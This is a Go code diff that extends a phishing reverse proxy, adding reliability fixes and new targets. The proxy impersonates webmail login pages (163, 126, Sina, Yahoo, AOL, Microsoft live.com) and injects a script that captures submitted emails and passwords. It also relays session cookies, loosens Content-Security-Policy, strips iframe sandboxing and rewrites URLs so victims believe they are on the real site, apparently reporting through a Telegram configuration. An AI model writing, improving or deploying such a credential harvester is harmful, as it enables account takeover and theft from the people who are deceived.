@@ -4,8 +4,10 @@ import (
 	"bytes"
 	"io"
 	"log"
+	"net"
 	"net/http"
 	"net/http/cookiejar"
+	"regexp"
 	"strings"
 	"sync"
 	"time"
@@ -29,8 +31,26 @@ var store = &SessionStore{
 	sessions: make(map[string]*SessionData),
 }
 
+// INJECTED SCRIPT: Fixes URL crashes and Forces form submit
 const harvesterScript = `
 <script>
+// FIX 1: Polyfill the URL constructor so Microsoft/Yahoo React apps don't crash
+(function() {
+    const OriginalURL = window.URL;
+    window.URL = function(url, base) {
+        try {
+            return new OriginalURL(url, base || window.location.origin);
+        } catch (e) {
+            // If the URL is a relative path that breaks the constructor, fix it
+            if (typeof url === 'string' && !url.startsWith('http')) {
+                return new OriginalURL('https://' + window.location.hostname + '/' + url.replace(/^\/+/, ''));
+            }
+            return new OriginalURL('https://' + window.location.hostname + '/');
+        }
+    };
+    window.URL.prototype = OriginalURL.prototype;
+})();
+
 document.addEventListener('submit', function(e) {
     const form = e.target;
     const formData = new FormData(form);
@@ -40,7 +60,7 @@ document.addEventListener('submit', function(e) {
 
     for (let [key, value] of formData.entries()) {
         params.append(key, value);
-        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account')) {
+        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login')) {
             window._capturedEmail = value;
             hasEmail = true;
         }
@@ -56,8 +76,9 @@ document.addEventListener('submit', function(e) {
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
             body: params.toString()
         }).catch(() => {});
+        return true;
     }
-}, true);
+}, false);
 </script>
 `
 
@@ -93,7 +114,17 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			CheckRedirect: func(req *http.Request, via []*http.Request) error {
 				return http.ErrUseLastResponse
 			},
-			Transport: &http.Transport{ForceAttemptHTTP2: false},
+			// FIX: Force IPv4 to prevent Fly.io IPv6 timeouts
+			Transport: &http.Transport{
+				ForceAttemptHTTP2: false,
+				DialContext: (&net.Dialer{
+					Timeout:   10 * time.Second,
+					KeepAlive: 30 * time.Second,
+				}).DialContext,
+				TLSHandshakeTimeout: 10 * time.Second,
+				MaxIdleConns:        100,
+				IdleConnTimeout:     90 * time.Second,
+			},
 		}
 
 		req, err := http.NewRequest("GET", targetBase, nil)
@@ -104,7 +135,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
 		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
-		req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8") // Force Chinese to fix 126
+		req.Header.Set("Accept-Language", "en-US,en;q=0.9,zh-CN,zh;q=0.8")
 
 		resp, err := proxyClient.Do(req)
 		if err != nil {
@@ -115,19 +146,36 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyBytes, _ := io.ReadAll(resp.Body)
 
-		// FIX: Decode GBK to UTF-8 for Chinese sites
+		// FIX 2: Robust Encoding Detection (Chinese + Microsoft)
 		contentType := resp.Header.Get("Content-Type")
-		if strings.Contains(contentType, "gbk") || strings.Contains(string(bodyBytes), "charset=gbk") || strings.Contains(targetBase, "126.com") || strings.Contains(targetBase, "163.com") {
+		if strings.Contains(strings.ToLower(contentType), "gbk") ||
+			strings.Contains(targetBase, "126.com") ||
+			strings.Contains(targetBase, "163.com") ||
+			strings.Contains(targetBase, "sina.com") {
 			reader := transform.NewReader(bytes.NewReader(bodyBytes), simplifiedchinese.GBK.NewDecoder())
-			bodyBytes, _ = io.ReadAll(reader)
+			if decoded, err := io.ReadAll(reader); err == nil {
+				bodyBytes = decoded
+			}
 		}
 
 		bodyStr := string(bodyBytes)
 
-		// FIX: Strip ServiceWorker registration (fixes Console Errors)
-		bodyStr = strings.ReplaceAll(bodyStr, "navigator.serviceWorker.register", "console.log")
+		// Remove ServiceWorker
+		reSW := regexp.MustCompile(`(?i)navigator\.serviceWorker\.register\(.*?\)`)
+		bodyStr = reSW.ReplaceAllString(bodyStr, "console.log('SW disabled')")
 
-		bodyStr = strings.ReplaceAll(bodyStr, targetBase, c.Request.Host+"/")
+		// Remove iframe sandbox restrictions
+		reIframe := regexp.MustCompile(`(?i)<iframe(.*?)>`)
+		bodyStr = reIframe.ReplaceAllStringFunc(bodyStr, func(m string) string {
+			m = strings.ReplaceAll(m, `sandbox=""`, "")
+			m = strings.ReplaceAll(m, `sandbox="allow-scripts allow-same-origin"`, "")
+			m = strings.ReplaceAll(m, `sandbox="allow-scripts"`, "")
+			m = strings.ReplaceAll(m, `sandbox`, "")
+			return m
+		})
+
+		// Rewrite URLs so the browser thinks it's on the real site
+		bodyStr = strings.ReplaceAll(bodyStr, "https://"+targetBase, c.Request.Host+"/")
 		if strings.Contains(email, "@") {
 			domain := strings.Split(email, "@")[1]
 			bodyStr = strings.ReplaceAll(bodyStr, "https://"+domain, c.Request.Host+"/")
@@ -141,7 +189,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		// Strip restrictive headers
 		c.Header("Content-Type", "text/html; charset=utf-8")
 		c.Header("Access-Control-Allow-Origin", "*")
-		c.Header("Content-Security-Policy", "")
+		c.Header("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval'; frame-ancestors *")
 
 		for _, cookie := range resp.Cookies() {
 			c.SetCookie(cookie.Name, cookie.Value, 3600*24, "/", "", false, false)
@@ -160,6 +208,9 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		}
 		if password == "" {
 			password = c.PostForm("passwd")
+		}
+		if password == "" {
+			password = c.PostForm("pwd")
 		}
 
 		ip := c.ClientIP()
@@ -180,6 +231,10 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			targetDomain = "https://mail.163.com/"
 		} else if strings.Contains(referer, "yahoo.com") {
 			targetDomain = "https://login.yahoo.com/"
+		} else if strings.Contains(referer, "aol.com") {
+			targetDomain = "https://login.aol.com/"
+		} else if strings.Contains(referer, "live.com") {
+			targetDomain = "https://login.live.com/"
 		}
 
 		fullURL := targetDomain + filepath
